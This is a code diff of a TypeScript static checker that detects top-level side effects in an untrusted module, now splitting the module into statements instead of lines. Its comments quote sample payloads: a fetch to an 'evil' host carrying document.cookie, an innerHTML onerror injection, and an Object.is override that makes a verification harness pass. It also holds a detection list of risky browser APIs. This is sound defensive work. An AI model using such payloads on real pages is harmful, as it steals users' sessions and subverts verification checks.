@@ -853,26 +853,53 @@ function stripLiterals(src: string): string {
     // token: after a value (identifier, number, `)`, `]`) a slash is division;
     // otherwise it opens a regex.
     if (c === "/") {
+      // IS THIS A REGEX OR A DIVISION?
+      //
+      // It matters because a regex passed through raw can contain an unmatched
+      // brace -- `const RE = /[{]/;` -- and that unbalances the depth counter
+      // everything downstream relies on.
+      //
+      // The rule is the previous meaningful TOKEN, not the previous character.
+      // Two ways the character-only test was wrong, both constructed and
+      // confirmed:
+      //   * `return /[{]/.test(s)` -- `n` is a word character, so this was read
+      //     as division and the regex went through raw. The keyword list below
+      //     fixes it.
+      //   * `const x = "5" / 2;` -- strings have already become `""`, so the
+      //     previous character is a quote, which was NOT in the value set, so a
+      //     real division was read as a regex. It then ran to end of line,
+      //     swallowed the newline and ate the start of the next line with it.
       let k = out.length - 1;
       while (k >= 0 && /\s/.test(out[k])) k--;
       const prev = k >= 0 ? out[k] : "";
-      const isDivision = /[\w$)\]]/.test(prev);
+      let word = "";
+      for (let w = k; w >= 0 && /[A-Za-z_$]/.test(out[w]); w--) word = out[w] + word;
+      const KEYWORDS = new Set([
+        "return", "typeof", "instanceof", "in", "of", "new", "delete", "void",
+        "case", "do", "else", "yield", "await", "throw",
+      ]);
+      const isDivision = /[\w$)\]"]/.test(prev) && !KEYWORDS.has(word);
       if (!isDivision) {
-        i++;                                            // consume the opening /
-        let inClass = false;
-        while (i < n) {
-          const ch = src[i];
-          if (ch === "\\") { i += 2; continue; }
+        // Scan ahead for the closing slash. If the line ends first this is not
+        // a regex at all -- treat the slash as an ordinary character and do NOT
+        // consume the newline, which is what used to delete the next line's
+        // leading identifier along with it.
+        let j = i + 1, inClass = false, closed = false;
+        while (j < n) {
+          const ch = src[j];
+          if (ch === "\\") { j += 2; continue; }
           if (ch === "[") inClass = true;
           else if (ch === "]") inClass = false;
-          else if (ch === "/" && !inClass) break;
-          else if (ch === "\n") break;                   // unterminated: bail out
-          i++;
+          else if (ch === "/" && !inClass) { closed = true; break; }
+          else if (ch === "\n") break;
+          j++;
         }
-        i++;                                            // consume the closing /
-        while (i < n && /[a-z]/.test(src[i])) i++;      // flags
-        out += "/x/";
-        continue;
+        if (closed) {
+          i = j + 1;
+          while (i < n && /[a-z]/.test(src[i])) i++;   // flags
+          out += "/x/";
+          continue;
+        }
       }
     }
     out += c; i++;
@@ -896,127 +923,140 @@ function stripLiterals(src: string): string {
  * so it is refused rather than reasoned about.
  */
 export function topLevelSideEffects(source: string): string[] {
-  const code = stripLiterals(source);
+  // SPLIT INTO STATEMENTS, NOT LINES.
+  //
+  // Every version of this that scanned LINES was defeated by putting two
+  // statements on one, and every patch for that ("also look at the tail of a
+  // declaration line") fixed one prefix and left the others. Measured, not
+  // argued: a line-based pass caught
+  //     function tick(w){ return w; } Object.is = () => true;
+  // and missed the identical payload written
+  //     const _a = () => {}; Object.is = () => true;
+  // -- while ALSO rejecting an ordinary multi-line arrow, which is how a check
+  // like this ends up switched off.
+  //
+  // A line is not a unit of execution. A top-level statement is. So the source
+  // is split on semicolons and block ends at depth zero, and every resulting
+  // statement is classified on its own. Then "what else is on this line" stops
+  // being a question that can be answered wrongly.
+  const statements = topLevelStatements(stripLiterals(source));
   const offenders: string[] = [];
-  let depth = 0;
 
-  for (const rawLine of code.split("\n")) {
-    const line = rawLine.trim();
-    const atTop = depth === 0;
+  for (const raw of statements) {
+    const stmt = raw.trim();
+    if (!stmt || stmt.startsWith("//") || stmt.startsWith("/*") || stmt.startsWith("*")) continue;
 
-    if (atTop && line && !line.startsWith("//") && !line.startsWith("/*") && !line.startsWith("*")
-        && line !== "}" && !line.startsWith("}") && !line.startsWith(")") && !line.startsWith("]")) {
-      // A declaration keyword was previously enough to pass. It is not: the
-      // dangerous part of a top-level statement is its INITIALISER, and
-      //     const _x = fetch("https://evil/?c=" + document.cookie);
-      // is a const declaration. Verified: every one of import/const/let/var/
-      // class defeated the old check, which then reported "the world runs
-      // nothing at module load: pass". This source is import()ed as a module by
-      // four public pages and the sandbox has no DOM, so nothing else can catch
-      // a browser-aimed payload.
-      //
-      // So the rule is about what EXECUTES, not what it is spelled with.
-      const decl = /^(?:export\s+)?(?:async\s+)?(?:function|class)\s/.test(line);
-      const binding = /^(?:export\s+)?(?:const|let|var)\s/.test(line);
-      const exportOnly = /^export\s*[{*]/.test(line);
+    // `import` is deliberately absent from every allowed shape: the world is
+    // self-contained, and a top-level import is a remote code fetch.
+    if (/^import\b/.test(stmt)) { offenders.push(stmt.slice(0, 90)); continue; }
 
-      // A DECLARATION DOES NOT MAKE THE REST OF THE LINE SAFE.
-      //
-      // This tested only the line's PREFIX, so everything after a complete
-      // declaration on the same line was never looked at:
-      //     function tick(w){ return w; } Object.is = () => true;
-      // matched `decl`, took the `else if` path, and was reported clean --
-      // while that trailing assignment, executing at module scope inside the
-      // verification harness, makes every comparison return true. Verified: it
-      // returned no offenders.
-      //
-      // So when a declaration closes on its own line, whatever follows it is
-      // re-examined as if it were its own line.
-      if (decl || exportOnly) {
-        let d = 0, cut = -1;
-        for (let ci = 0; ci < line.length; ci++) {
-          const ch = line[ci];
-          if (ch === "{" || ch === "(" || ch === "[") d++;
-          else if (ch === "}" || ch === ")" || ch === "]") {
-            d--;
-            if (d === 0 && ch === "}") { cut = ci + 1; break; }
-          }
-        }
-        if (cut > -1) {
-          const tail = line.slice(cut).replace(/^[\s;]+/, "");
-          if (tail.length > 0) offenders.push(tail.slice(0, 90));
-        }
-      }
+    const isFn = /^(?:export\s+(?:default\s+)?)?(?:async\s+)?function\b/.test(stmt);
+    const isClass = /^(?:export\s+(?:default\s+)?)?class\b/.test(stmt);
+    const isBinding = /^(?:export\s+)?(?:const|let|var)\s/.test(stmt);
+    const isExportOnly = /^export\s*[{*]/.test(stmt);
 
-      if (!decl && !binding && !exportOnly) {
-        offenders.push(line.slice(0, 90));                    // a bare statement
-      } else if (binding) {
-        // a binding is fine only if its initialiser cannot run anything
-        const rhs = line.slice(line.indexOf("=") + 1);
-        if (line.includes("=")) {
-          // Calls are not the only way an initialiser can do work:
-          //     var _y = (document.body.innerHTML = "<img src=x onerror=...>");
-          // is an ASSIGNMENT, contains no call, and defeated a call-only test.
-          // So an initialiser must neither invoke anything nor assign anything.
-          // A FUNCTION EXPRESSION IS A DEFINITION, NOT A CALL.
-          //
-          // `const slug = (s) => s.replace(RE, "").trim();` was flagged,
-          // because the call test looks at the whole right-hand side and sees
-          // .replace( and .trim( -- neither of which runs at module load; they
-          // run when someone calls slug. Rejecting ordinary code is not a safe
-          // default, it is how a check gets switched off.
-          //
-          // The discriminator is depth. In a real arrow the `=>` sits at depth
-          // zero:            (s) => s.replace(...)
-          // In an IIFE it does not, because the wrapping paren is still open:
-          //                  (() => { fetch(x); })()
-          // So: a depth-zero `=>`, or a leading `function` whose body is the
-          // entire right-hand side, is a definition and its body is not
-          // examined. Anything else is.
-          const isDefinition = (() => {
-            const r = rhs.trim().replace(/;+$/, "");
-            let d = 0;
-            for (let ci = 0; ci < r.length; ci++) {
-              const ch = r[ci];
-              if (ch === "(" || ch === "[" || ch === "{") d++;
-              else if (ch === ")" || ch === "]" || ch === "}") d--;
-              else if (ch === "=" && r[ci + 1] === ">" && d === 0) return true;
-            }
-            if (!/^(?:async\s+)?function\b/.test(r)) return false;
-            // a function expression counts only if nothing follows its body,
-            // so `function(){}()` -- an IIFE -- is still rejected
-            d = 0;
-            for (let ci = 0; ci < r.length; ci++) {
-              const ch = r[ci];
-              if (ch === "{") d++;
-              else if (ch === "}") {
-                d--;
-                if (d === 0) return r.slice(ci + 1).trim().length === 0;
-              }
-            }
-            return false;
-          })();
-          if (isDefinition) continue;
-          const calls = /[\w$)\]]\s*\(/.test(rhs);
-          const assigns = /(^|[^=!<>])=(?!=|>)/.test(rhs);      // '=' that is not ==, ===, !=, <=, >=, =>
-          const reaches = /\b(document|window|globalThis|self|fetch|eval|Function|XMLHttpRequest|WebSocket|localStorage)\b/.test(rhs);
-          if (calls || assigns || reaches) offenders.push(line.slice(0, 90));
-        }
-      }
-      // `import` is deliberately absent from every allowed shape: the world is
-      // self-contained, and a top-level import is a remote code fetch.
-      if (/^import\b/.test(line)) offenders.push(line.slice(0, 90));
-      // class static initialiser blocks run at definition time
-      if (decl && /\bstatic\s*\{/.test(line)) offenders.push(line.slice(0, 90));
+    if (isFn) continue;                        // a declaration defines, it does not run
+    if (isClass) {
+      // class static initialiser blocks DO run at definition time
+      if (/\bstatic\s*\{/.test(stmt)) offenders.push(stmt.slice(0, 90));
+      continue;
     }
+    if (isExportOnly) continue;
 
-    for (const ch of rawLine) {
-      if (ch === "{" || ch === "(" || ch === "[") depth++;
-      else if (ch === "}" || ch === ")" || ch === "]") depth--;
-    }
-    if (depth < 0) depth = 0;
+    if (!isBinding) { offenders.push(stmt.slice(0, 90)); continue; }   // a bare statement
+
+    // A binding is fine only if its initialiser cannot run anything.
+    const eq = stmt.indexOf("=");
+    if (eq === -1) continue;                   // `let x;` declares nothing executable
+    const rhs = stmt.slice(eq + 1);
+
+    // A FUNCTION EXPRESSION IS A DEFINITION, NOT A CALL. Its body runs when it
+    // is called, not at module load, so the body is not examined -- otherwise
+    //     const slug = (s) => s.replace(RE, "").trim();
+    // is rejected, and a check that rejects ordinary code gets removed.
+    //
+    // The discriminator is depth: in a real arrow the `=>` sits at depth zero,
+    //     (s) => s.replace(...)
+    // and in an IIFE it does not, because the wrapping paren is still open,
+    //     (() => { fetch(x); })()
+    if (isDefinitionInitialiser(rhs)) continue;
+
+    // Calls are not the only way an initialiser can do work:
+    //     var _y = (document.body.innerHTML = "<img src=x onerror=...>");
+    // is an ASSIGNMENT, contains no call, and defeated a call-only test. So an
+    // initialiser must neither invoke anything nor assign anything.
+    const calls = /[\w$)\]]\s*\(/.test(rhs);
+    const assigns = /(^|[^=!<>])=(?!=|>)/.test(rhs);
+    const reaches = /\b(document|window|globalThis|self|fetch|eval|Function|XMLHttpRequest|WebSocket|localStorage|import)\b/.test(rhs);
+    if (calls || assigns || reaches) offenders.push(stmt.slice(0, 90));
   }
+
   return offenders;
+}
+
+/**
+ * Is this initialiser a function DEFINITION (which does not run) rather than an
+ * expression that does work? See the note at the call site for why depth is the
+ * discriminator.
+ */
+function isDefinitionInitialiser(rhs: string): boolean {
+  const r = rhs.trim().replace(/;+$/, "");
+  let d = 0;
+  for (let i = 0; i < r.length; i++) {
+    const ch = r[i];
+    if (ch === "(" || ch === "[" || ch === "{") d++;
+    else if (ch === ")" || ch === "]" || ch === "}") d--;
+    else if (ch === "=" && r[i + 1] === ">" && d === 0) return true;
+  }
+  if (!/^(?:async\s+)?function\b/.test(r)) return false;
+  // a function expression counts only if NOTHING follows its body, so
+  // `function(){}()` -- an IIFE -- is still rejected
+  d = 0;
+  for (let i = 0; i < r.length; i++) {
+    const ch = r[i];
+    if (ch === "{") d++;
+    else if (ch === "}") {
+      d--;
+      if (d === 0) return r.slice(i + 1).trim().length === 0;
+    }
+  }
+  return false;
+}
+
+/**
+ * Split literal-stripped source into top-level statements.
+ *
+ * A statement ends at a depth-zero `;`, or at the `}` that closes a depth-zero
+ * block (a function or class declaration, which needs no semicolon). Anything
+ * nested is part of the statement that opened it, which is what makes a
+ * multi-line function body invisible to the classifier above -- correctly, since
+ * its contents do not run at module load.
+ */
+function topLevelStatements(code: string): string[] {
+  const out: string[] = [];
+  let depth = 0, buf = "";
+  for (let i = 0; i < code.length; i++) {
+    const ch = code[i];
+    buf += ch;
+    if (ch === "(" || ch === "[" || ch === "{") depth++;
+    else if (ch === ")" || ch === "]" || ch === "}") {
+      depth--;
+      if (depth < 0) depth = 0;
+      if (depth === 0 && ch === "}") {
+        // `}` closes a declaration body only when the statement began as one;
+        // an object literal binding is closed by its own `;` instead, so let
+        // the semicolon case handle that and avoid splitting mid-statement.
+        const t = buf.trim();
+        if (/^(?:export\s+(?:default\s+)?)?(?:async\s+)?(?:function|class)\b/.test(t)) {
+          out.push(t); buf = "";
+        }
+      }
+    } else if (ch === ";" && depth === 0) {
+      out.push(buf.trim()); buf = "";
+    }
+  }
+  if (buf.trim()) out.push(buf.trim());
+  return out;
 }
 
 export function worldIntegrityChecks(before: string, after: string, dataEditExpected: boolean): IntegrityResult[] {
